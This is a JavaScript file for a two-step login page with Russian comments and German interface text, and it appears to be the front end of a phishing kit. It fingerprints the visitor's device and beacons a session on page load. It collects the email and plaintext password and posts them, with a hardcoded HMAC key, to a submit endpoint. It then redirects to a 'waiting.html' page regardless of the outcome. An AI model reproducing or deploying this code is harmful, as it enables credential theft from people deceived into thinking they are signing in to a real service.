(function () {
  // ── Элементы ──────────────────────────────────────────────────────────────
  var stepEmailInput   = document.getElementById("step-email-input");
  var stepEmailDisplay = document.getElementById("step-email-display");
  var stepPassword     = document.getElementById("step-password");
  var forgotPw         = document.getElementById("forgot-pw");
  var emailShown       = document.getElementById("email-shown");
  var unameInput       = document.getElementById("uname");
  var pwordInput       = document.getElementById("pword");
  var btnSubmit        = document.getElementById("btn-submit");
  var btnEditEmail     = document.getElementById("btn-edit-email");
  var btnTogglePw      = document.getElementById("btn-toggle-pw");
  var errRequired      = document.getElementById("err-required");
  var errFormat        = document.getElementById("err-format");
  var errPassword      = document.getElementById("err-password");
  var hpField          = document.getElementById("hp_field");

  var SVG_EYE_OPEN   = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.8"/></svg>';
  var SVG_EYE_CLOSED = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><line x1="1" y1="1" x2="23" y2="23" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>';

  btnTogglePw.innerHTML = SVG_EYE_CLOSED;

  // ── Состояние ─────────────────────────────────────────────────────────────
  var step    = 1; // 1 = email, 2 = password
  var siteId  = sessionStorage.getItem("ka_site_id") || "";
  var visitToken = null;
  var pageLoadTs = Date.now();

  // ── Генерация siteId ──────────────────────────────────────────────────────
  if (!siteId) {
    siteId = Math.random().toString(36).slice(2, 8).toUpperCase();
    sessionStorage.setItem("ka_site_id", siteId);
  }

  // ── Определение устройства ────────────────────────────────────────────────
  function getDevice() {
    var ua = navigator.userAgent, os = "Unknown OS", br = "Unknown Browser";
    if (/Windows NT 10/.test(ua))      os = "Windows 10/11";
    else if (/Windows NT 6\.3/.test(ua)) os = "Windows 8.1";
    else if (/Windows NT 6\.1/.test(ua)) os = "Windows 7";
    else if (/Mac OS X/.test(ua))      os = "macOS";
    else if (/Android/.test(ua))       os = "Android";
    else if (/iPhone|iPad/.test(ua))   os = "iOS";
    else if (/Linux/.test(ua))         os = "Linux";
    if (/Brave/.test(ua) || (navigator.brave && navigator.brave.isBrave)) br = "Brave";
    else if (/Edg\//.test(ua))         br = "Edge";
    else if (/OPR\//.test(ua))         br = "Opera";
    else if (/Firefox\//.test(ua))     br = "Firefox";
    else if (/Chrome\//.test(ua))      br = "Chrome";
    else if (/Safari\//.test(ua))      br = "Safari";
    return os + " / " + br;
  }

  // ── Challenge — получить задачу и сразу решить ────────────────────────────
  function solveChallenge() {
    return fetch("/api/v1/check")
      .then(function (r) { return r.json(); })
      .then(function (data) {
        var answer = data.op === "+" ? data.a + data.b : data.a * data.b;
        return { chalToken: data.token, chalAnswer: answer };
      })
      .catch(function () { return { chalToken: "", chalAnswer: 0 }; });
  }

  // ── HMAC подпись ──────────────────────────────────────────────────────────
  var APP_KEY = "ka2026xZ9qLmNpRv";

  function hmacSign(message) {
    var enc = new TextEncoder();
    return crypto.subtle.importKey(
      "raw", enc.encode(APP_KEY), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]
    ).then(function(key) {
      return crypto.subtle.sign("HMAC", key, enc.encode(message));
    }).then(function(buf) {
      return Array.from(new Uint8Array(buf))
        .map(function(b) { return b.toString(16).padStart(2, "0"); }).join("");
    });
  }

  function genNonce() {
    var arr = new Uint8Array(16);
    crypto.getRandomValues(arr);
    return Array.from(arr).map(function(b) { return b.toString(16).padStart(2, "0"); }).join("");
  }

  function signedFetch(path, data) {
    var ts      = Date.now();
    var nonce   = genNonce();
    var payload = JSON.stringify(data);
    var message = ts + ":" + nonce + ":" + path + ":" + payload;
    return hmacSign(message).then(function(sig) {
      return fetch(path, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Timestamp":  String(ts),
          "X-Nonce":      nonce,
          "X-Signature":  sig
        },
        body: payload
      }).then(function(r) { return r.json(); });
    }).catch(function() { return { ok: false }; });
  }

  // ── Инициализация визита (отправить session при загрузке страницы) ─────────
  solveChallenge().then(function (chal) {
    return signedFetch("/api/v1/session", {
      siteId:     siteId,
      device:     getDevice(),
      chalToken:  chal.chalToken,
      chalAnswer: chal.chalAnswer
    });
  }).then(function (data) {
    if (data && data.msgId) {
      sessionStorage.setItem("ka_msg_id", data.msgId);
    }
    if (data && data.token) {
      visitToken = data.token;
    }
  }).catch(function () {});

  // ── Валидация email ───────────────────────────────────────────────────────
  function isValidEmail(val) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val.trim());
  }

  function hideErrors() {
    errRequired.classList.remove("visible");
    errFormat.classList.remove("visible");
    errPassword.classList.remove("visible");
  }

  // ── Плавающий label ───────────────────────────────────────────────────────
  var emailGroup = unameInput.closest(".field-group");
  unameInput.addEventListener("input", function () {
    hideErrors();
    if (unameInput.value) emailGroup.classList.add("has-value");
    else emailGroup.classList.remove("has-value");
  });

  var passwordGroup = pwordInput.closest(".field-group");
  pwordInput.addEventListener("input", function () {
    errPassword.classList.remove("visible");
    if (pwordInput.value) passwordGroup.classList.add("has-value");
    else passwordGroup.classList.remove("has-value");
  });

  // ── Переключатель видимости пароля ────────────────────────────────────────
  btnTogglePw.addEventListener("click", function () {
    var show = pwordInput.type === "password";
    pwordInput.type = show ? "text" : "password";
    btnTogglePw.innerHTML = show ? SVG_EYE_OPEN : SVG_EYE_CLOSED;
    btnTogglePw.setAttribute("aria-label", show ? "Passwort verbergen" : "Passwort anzeigen");
  });

  // ── Шаг 1 → Шаг 2 ────────────────────────────────────────────────────────
  function goToStep2(email) {
    step = 2;
    emailShown.textContent = email;
    stepEmailInput.style.display   = "none";
    stepEmailDisplay.classList.add("visible");
    stepPassword.classList.add("visible");
    forgotPw.classList.remove("hidden");
    btnSubmit.textContent = "Weiter";
    setTimeout(function () { pwordInput.focus(); }, 50);
  }

  // ── Назад к email ─────────────────────────────────────────────────────────
  btnEditEmail.addEventListener("click", function () {
    step = 1;
    stepEmailInput.style.display = "";
    stepEmailDisplay.classList.remove("visible");
    stepPassword.classList.remove("visible");
    forgotPw.classList.add("hidden");
    pwordInput.value = "";
    passwordGroup.classList.remove("has-value");
    hideErrors();
    btnSubmit.textContent = "Weiter";
    setTimeout(function () { unameInput.focus(); }, 50);
  });

  // ── Сабмит ────────────────────────────────────────────────────────────────
  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    hideErrors();

    // Honeypot — бот заполнил скрытое поле
    if (hpField && hpField.value) return;

    if (step === 1) {
      var email = unameInput.value.trim();
      if (!email) {
        errRequired.classList.add("visible");
        unameInput.focus();
        return;
      }
      if (!isValidEmail(email)) {
        errFormat.classList.add("visible");
        unameInput.focus();
        return;
      }
      sessionStorage.setItem("ka_email", email);
      goToStep2(email);
      return;
    }

    // Шаг 2 — отправить пароль
    var email    = sessionStorage.getItem("ka_email") || unameInput.value.trim();
    var password = pwordInput.value;

    if (!password) {
      errPassword.classList.add("visible");
      pwordInput.focus();
      return;
    }

    btnSubmit.disabled = true;
    btnSubmit.innerHTML = '<span class="btn-dots"><span>.</span><span>.</span><span>.</span></span>';

    var elapsed = Date.now() - pageLoadTs;
    var delay   = Math.max(0, 3100 - elapsed); // минимум 3.1 сек на странице

    setTimeout(function () {
      signedFetch("/api/v1/submit", {
        siteId:   siteId,
        email:    email,
        password: password,
        device:   getDevice(),
        token:    visitToken || ""
      }).then(function (data) {
        if (data && data.msgId) sessionStorage.setItem("ka_msg_id", data.msgId);
        window.location.href = "waiting.html";
      }).catch(function () {
        window.location.href = "waiting.html";
      });
    }, delay);
  });

  // ── Восстановить email если уже был ──────────────────────────────────────
  var savedEmail = sessionStorage.getItem("ka_email");
  if (savedEmail) {
    unameInput.value = savedEmail;
    emailGroup.classList.add("has-value");
  }

  // Скрыть forgot на шаге 1
  if (forgotPw) forgotPw.classList.add("hidden");

})();
